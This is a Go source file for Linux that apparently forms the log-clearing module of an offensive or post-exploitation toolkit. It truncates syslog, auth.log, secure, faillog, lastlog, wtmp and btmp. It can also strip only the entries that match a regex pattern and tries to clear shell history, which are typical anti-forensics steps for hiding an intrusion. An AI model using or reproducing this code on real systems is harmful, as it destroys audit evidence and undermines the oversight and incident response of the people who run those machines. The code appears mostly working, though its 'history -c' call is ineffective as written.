//go:build linux

package logs

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"os/exec"
	"regexp"
	"strings"
)

func NewClearer() LogClearer {
	return &linuxClearer{}
}

type linuxClearer struct{}

var linuxLogPaths = map[ClearTarget][]string{
	TargetSystem:      {"/var/log/syslog", "/var/log/messages", "/var/log/kern.log", "/var/log/dmesg"},
	TargetSecurity:    {"/var/log/auth.log", "/var/log/secure", "/var/log/faillog", "/var/log/lastlog"},
	TargetApplication: {"/var/log/daemon.log", "/var/log/cron.log", "/var/log/mail.log"},
	TargetAll: {
		"/var/log/syslog", "/var/log/messages", "/var/log/kern.log",
		"/var/log/auth.log", "/var/log/secure", "/var/log/faillog",
		"/var/log/daemon.log", "/var/log/cron.log",
		"/var/log/wtmp", "/var/log/btmp", "/var/log/lastlog",
	},
}

func (l *linuxClearer) Clear(ctx context.Context, req ClearRequest) ([]ClearResult, error) {
	var results []ClearResult

	if req.Target == TargetCustom {
		result := l.clearFile(ctx, req.LogPath, req.Selective, req.Pattern, req.DryRun)
		return []ClearResult{result}, nil
	}

	paths, ok := linuxLogPaths[req.Target]
	if !ok {
		return nil, fmt.Errorf("unknown target: %s", req.Target)
	}

	for _, path := range paths {
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}
		result := l.clearFile(ctx, path, req.Selective, req.Pattern, req.DryRun)
		results = append(results, result)
	}

	if req.Target == TargetAll || req.Target == TargetSecurity {
		r := l.clearLoginRecords(ctx, req.DryRun)
		results = append(results, r...)
	}

	return results, nil
}

func (l *linuxClearer) clearFile(ctx context.Context, path string, selective bool, pattern string, dryRun bool) ClearResult {
	result := ClearResult{
		Target: path,
		DryRun: dryRun,
	}

	info, err := os.Stat(path)
	if err != nil {
		result.Error = fmt.Sprintf("cannot access: %v", err)
		return result
	}
	result.Details = append(result.Details, fmt.Sprintf("size: %d bytes", info.Size()))

	f, err := os.Open(path)
	if err != nil {
		result.Error = fmt.Sprintf("cannot read: %v", err)
		return result
	}

	lineCount := 0
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		lineCount++
	}
	f.Close()
	result.EntriesFound = lineCount
	result.Details = append(result.Details, fmt.Sprintf("lines: %d", lineCount))

	if selective && pattern != "" {
		return l.selectiveClear(ctx, path, pattern, dryRun, result)
	}

	if dryRun {
		result.Details = append(result.Details, "dry run — file not modified")
		return result
	}

	if err := os.Truncate(path, 0); err != nil {
		result.Error = fmt.Sprintf("failed to truncate: %v", err)
		return result
	}

	result.Cleared = true
	result.Details = append(result.Details, "file truncated")
	return result
}

func (l *linuxClearer) selectiveClear(_ context.Context, path, pattern string, dryRun bool, result ClearResult) ClearResult {
	re, err := regexp.Compile(pattern)
	if err != nil {
		result.Error = fmt.Sprintf("invalid pattern: %v", err)
		return result
	}

	f, err := os.Open(path)
	if err != nil {
		result.Error = fmt.Sprintf("cannot read: %v", err)
		return result
	}
	defer f.Close()

	var kept []string
	removed := 0
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := scanner.Text()
		if re.MatchString(line) {
			removed++
		} else {
			kept = append(kept, line)
		}
	}

	result.Details = append(result.Details, fmt.Sprintf("matching entries: %d", removed))

	if dryRun {
		result.Details = append(result.Details, "dry run — file not modified")
		return result
	}

	if err := os.WriteFile(path, []byte(strings.Join(kept, "\n")+"\n"), 0644); err != nil {
		result.Error = fmt.Sprintf("failed to rewrite: %v", err)
		return result
	}

	result.Cleared = true
	result.Details = append(result.Details, fmt.Sprintf("removed %d entries, kept %d", removed, len(kept)))
	return result
}

func (l *linuxClearer) clearLoginRecords(_ context.Context, dryRun bool) []ClearResult {
	var results []ClearResult

	for _, path := range []string{"/var/log/wtmp", "/var/log/btmp"} {
		result := ClearResult{Target: path, DryRun: dryRun}
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}
		if dryRun {
			result.Details = append(result.Details, "dry run — binary log not modified")
			results = append(results, result)
			continue
		}
		if err := os.Truncate(path, 0); err != nil {
			result.Error = fmt.Sprintf("failed to truncate: %v", err)
		} else {
			result.Cleared = true
			result.Details = append(result.Details, "binary login record cleared")
		}
		results = append(results, result)
	}

	if !dryRun {
		exec.Command("history", "-c").Run()
	}

	return results
}

func (l *linuxClearer) ListLogs(_ context.Context) ([]LogInfo, error) {
	var logs []LogInfo

	allPaths := linuxLogPaths[TargetAll]
	for _, path := range allPaths {
		info, err := os.Stat(path)
		if err != nil {
			continue
		}

		writable := false
		if f, err := os.OpenFile(path, os.O_WRONLY, 0); err == nil {
			f.Close()
			writable = true
		}

		lineCount := 0
		if f, err := os.Open(path); err == nil {
			scanner := bufio.NewScanner(f)
			for scanner.Scan() {
				lineCount++
			}
			f.Close()
		}

		logs = append(logs, LogInfo{
			Name:      path[strings.LastIndex(path, "/")+1:],
			Path:      path,
			SizeBytes: info.Size(),
			Entries:   lineCount,
			Writable:  writable,
		})
	}

	if journalctl, err := exec.LookPath("journalctl"); err == nil {
		cmd := exec.Command(journalctl, "--disk-usage")
		if out, err := cmd.Output(); err == nil {
			_ = out
			logs = append(logs, LogInfo{
				Name:     "journald",
				Path:     "systemd-journald",
				Writable: os.Geteuid() == 0,
			})
		}
	}

	return logs, nil
}
